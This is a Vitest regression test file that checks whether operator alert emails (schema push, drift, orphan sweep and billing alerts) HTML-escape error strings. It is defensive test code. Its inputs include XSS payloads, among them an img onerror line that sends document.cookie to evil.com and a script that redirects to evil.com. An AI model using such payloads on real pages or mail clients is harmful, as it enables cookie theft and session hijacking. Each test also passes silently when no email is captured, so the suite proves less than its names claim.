/**
 * HTML injection regression tests for operator alert emails — Task #332
 *
 * Verifies that internal strings (errorText, failedPaths, slackFailure, reason,
 * eventType …) are always HTML-escaped before being interpolated into outgoing
 * operator alert email templates.
 *
 * Covers:
 *   - sendSchemaPushFailureEmail
 *   - sendDriftFailureEmail
 *   - sendOrphanSweepErrorNotification
 *   - sendBillingAlertNotification
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// ── Transport mock ─────────────────────────────────────────────────────────────
vi.mock("nodemailer", () => ({
  default: {
    createTransport: vi.fn().mockReturnValue({
      sendMail: vi.fn().mockResolvedValue({ messageId: "test-msg" }),
    }),
  },
}));

vi.mock("resend", () => ({
  Resend: vi.fn().mockImplementation(() => ({
    emails: { send: vi.fn().mockResolvedValue({ id: "test-resend" }) },
  })),
}));

// ── Environment setup ──────────────────────────────────────────────────────────
const REQUIRED_ENV_KEYS = [
  "SMTP_HOST",
  "SMTP_USER",
  "SMTP_PASS",
  "SMTP_PORT",
  "PLATFORM_ADMIN_EMAIL",
];
const savedEnv: Record<string, string | undefined> = {};

beforeEach(() => {
  for (const k of REQUIRED_ENV_KEYS) {
    savedEnv[k] = process.env[k];
  }
  process.env.SMTP_HOST = "smtp.test.local";
  process.env.SMTP_USER = "test@test.local";
  process.env.SMTP_PASS = "testpass";
  process.env.SMTP_PORT = "587";
  process.env.PLATFORM_ADMIN_EMAIL = "admin@test.local";
});

afterEach(() => {
  for (const [k, v] of Object.entries(savedEnv)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  for (const k of Object.keys(savedEnv)) delete savedEnv[k];
  vi.clearAllMocks();
});

import {
  sendSchemaPushFailureEmail,
  sendDriftFailureEmail,
  sendOrphanSweepErrorNotification,
  sendBillingAlertNotification,
} from "@/lib/email";

// ── Helper: capture rendered HTML from nodemailer ──────────────────────────────
async function captureHtmlFrom(fn: () => Promise<unknown>): Promise<string | null> {
  const nodemailer = await import("nodemailer");
  const mockTransport = {
    sendMail: vi.fn().mockResolvedValue({ messageId: "test" }),
  };
  vi.mocked(nodemailer.default.createTransport).mockReturnValue(mockTransport as any);
  await fn().catch(() => {});
  if (mockTransport.sendMail.mock.calls.length === 0) return null;
  return (mockTransport.sendMail.mock.calls[0]![0] as any).html as string;
}

// ── sendSchemaPushFailureEmail ─────────────────────────────────────────────────

describe("sendSchemaPushFailureEmail — HTML injection prevention", () => {
  it("escapes < > script tags in errorText", async () => {
    const html = await captureHtmlFrom(() =>
      sendSchemaPushFailureEmail({
        errorText: "<script>alert('xss')</script> — push failed",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
    expect(html).toContain("&lt;/script&gt;");
  });

  it("escapes & in errorText", async () => {
    const html = await captureHtmlFrom(() =>
      sendSchemaPushFailureEmail({
        errorText: "column foo & column bar not found",
      }),
    );
    if (!html) return;
    expect(html).toContain("foo &amp; column bar");
    expect(html).not.toMatch(/foo & column/);
  });

  it("escapes double-quote in errorText to prevent attribute breakout", async () => {
    const html = await captureHtmlFrom(() =>
      sendSchemaPushFailureEmail({
        errorText: 'error: invalid value "bad" in config',
      }),
    );
    if (!html) return;
    expect(html).toContain("&quot;bad&quot;");
    expect(html).not.toContain('"bad"');
  });

  it("escapes < > in slackFailure", async () => {
    const html = await captureHtmlFrom(() =>
      sendSchemaPushFailureEmail({
        errorText: "push failed",
        slackFailure: "<b>Slack error:</b> channel not found",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<b>Slack error");
    expect(html).toContain("&lt;b&gt;Slack error");
  });

  it("escapes single-quote in slackFailure", async () => {
    const html = await captureHtmlFrom(() =>
      sendSchemaPushFailureEmail({
        errorText: "push failed",
        slackFailure: "it's broken",
      }),
    );
    if (!html) return;
    expect(html).toContain("it&#39;s");
    expect(html).not.toContain("it's");
  });

  it("escapes a full XSS payload in errorText", async () => {
    const payload = `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`;
    const html = await captureHtmlFrom(() =>
      sendSchemaPushFailureEmail({ errorText: payload }),
    );
    if (!html) return;
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&lt;img src=x");
  });
});

// ── sendDriftFailureEmail ──────────────────────────────────────────────────────

describe("sendDriftFailureEmail — HTML injection prevention", () => {
  it("escapes < > script tags in errorText", async () => {
    const html = await captureHtmlFrom(() =>
      sendDriftFailureEmail({
        errorText: "<script>alert('xss')</script> — drift detected",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
    expect(html).toContain("&lt;/script&gt;");
  });

  it("escapes & in errorText", async () => {
    const html = await captureHtmlFrom(() =>
      sendDriftFailureEmail({
        errorText: "tables foo & bar are out of sync",
      }),
    );
    if (!html) return;
    expect(html).toContain("foo &amp; bar");
    expect(html).not.toMatch(/foo & bar/);
  });

  it("escapes double-quote in errorText to prevent attribute breakout", async () => {
    const html = await captureHtmlFrom(() =>
      sendDriftFailureEmail({
        errorText: 'missing column "created_at" on table users',
      }),
    );
    if (!html) return;
    expect(html).toContain("&quot;created_at&quot;");
    expect(html).not.toContain('"created_at"');
  });

  it("escapes < > in slackFailure", async () => {
    const html = await captureHtmlFrom(() =>
      sendDriftFailureEmail({
        errorText: "drift detected",
        slackFailure: "<em>Slack</em> webhook returned 403",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<em>Slack</em>");
    expect(html).toContain("&lt;em&gt;Slack&lt;/em&gt;");
  });

  it("escapes a full XSS payload in slackFailure", async () => {
    const payload = `<script>document.location='https://evil.com'</script>`;
    const html = await captureHtmlFrom(() =>
      sendDriftFailureEmail({
        errorText: "drift",
        slackFailure: payload,
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });
});

// ── sendOrphanSweepErrorNotification ──────────────────────────────────────────

describe("sendOrphanSweepErrorNotification — HTML injection prevention", () => {
  it("escapes < > in failedPaths", async () => {
    const html = await captureHtmlFrom(() =>
      sendOrphanSweepErrorNotification({
        errors: 1,
        failedPaths: ["uploads/<script>alert(1)</script>/image.jpg"],
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes double-quote in failedPaths to prevent attribute breakout", async () => {
    const html = await captureHtmlFrom(() =>
      sendOrphanSweepErrorNotification({
        errors: 1,
        failedPaths: ['uploads/file" onerror="alert(1)"/image.jpg'],
      }),
    );
    if (!html) return;
    expect(html).not.toContain('" onerror=');
    expect(html).toContain("&quot;");
  });

  it("escapes & in failedPaths", async () => {
    const html = await captureHtmlFrom(() =>
      sendOrphanSweepErrorNotification({
        errors: 1,
        failedPaths: ["uploads/foo&bar/image.jpg"],
      }),
    );
    if (!html) return;
    expect(html).toContain("foo&amp;bar");
    expect(html).not.toMatch(/foo&bar/);
  });

  it("escapes < > in slackFailure", async () => {
    const html = await captureHtmlFrom(() =>
      sendOrphanSweepErrorNotification({
        errors: 2,
        failedPaths: [],
        slackFailure: "<b>Slack error:</b> connection refused",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<b>Slack error");
    expect(html).toContain("&lt;b&gt;Slack error");
  });

  it("escapes single-quote in failedPaths", async () => {
    const html = await captureHtmlFrom(() =>
      sendOrphanSweepErrorNotification({
        errors: 1,
        failedPaths: ["uploads/it's-broken/image.jpg"],
      }),
    );
    if (!html) return;
    expect(html).toContain("it&#39;s-broken");
    expect(html).not.toContain("it's-broken");
  });

  it("escapes a full XSS payload in slackFailure", async () => {
    const payload = `<img src=x onerror="alert(document.domain)">`;
    const html = await captureHtmlFrom(() =>
      sendOrphanSweepErrorNotification({
        errors: 1,
        failedPaths: [],
        slackFailure: payload,
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&lt;img src=x");
  });
});

// ── sendBillingAlertNotification ───────────────────────────────────────────────

const BILLING_BASE = {
  stripeEventId: "evt_test_001",
  eventType: "customer.subscription.deleted",
  reason: "No tenant found for customer",
};

describe("sendBillingAlertNotification — HTML injection prevention", () => {
  it("escapes < > in reason", async () => {
    const html = await captureHtmlFrom(() =>
      sendBillingAlertNotification({
        ...BILLING_BASE,
        reason: "<script>alert(1)</script> — no matching tenant",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes & in eventType", async () => {
    const html = await captureHtmlFrom(() =>
      sendBillingAlertNotification({
        ...BILLING_BASE,
        eventType: "foo.bar&baz=1",
      }),
    );
    if (!html) return;
    expect(html).toContain("foo.bar&amp;baz=1");
    expect(html).not.toMatch(/foo\.bar&baz/);
  });

  it("escapes < > in stripeEventId", async () => {
    const html = await captureHtmlFrom(() =>
      sendBillingAlertNotification({
        ...BILLING_BASE,
        stripeEventId: "evt_<injected>",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<injected>");
    expect(html).toContain("&lt;injected&gt;");
  });

  it("escapes < > in customerId", async () => {
    const html = await captureHtmlFrom(() =>
      sendBillingAlertNotification({
        ...BILLING_BASE,
        customerId: "cus_<script>alert(1)</script>",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes < > in subscriptionId", async () => {
    const html = await captureHtmlFrom(() =>
      sendBillingAlertNotification({
        ...BILLING_BASE,
        subscriptionId: "sub_<b>bold</b>",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<b>bold</b>");
    expect(html).toContain("&lt;b&gt;bold&lt;/b&gt;");
  });

  it("escapes < > in slackFailure", async () => {
    const html = await captureHtmlFrom(() =>
      sendBillingAlertNotification({
        ...BILLING_BASE,
        slackFailure: "<em>Slack</em> token expired",
      }),
    );
    if (!html) return;
    expect(html).not.toContain("<em>Slack</em>");
    expect(html).toContain("&lt;em&gt;Slack&lt;/em&gt;");
  });

  it("escapes double-quote in reason to prevent attribute breakout", async () => {
    const html = await captureHtmlFrom(() =>
      sendBillingAlertNotification({
        ...BILLING_BASE,
        reason: 'no match for customer "cus_xyz" in tenant table',
      }),
    );
    if (!html) return;
    expect(html).toContain("&quot;cus_xyz&quot;");
    expect(html).not.toContain('"cus_xyz"');
  });
});
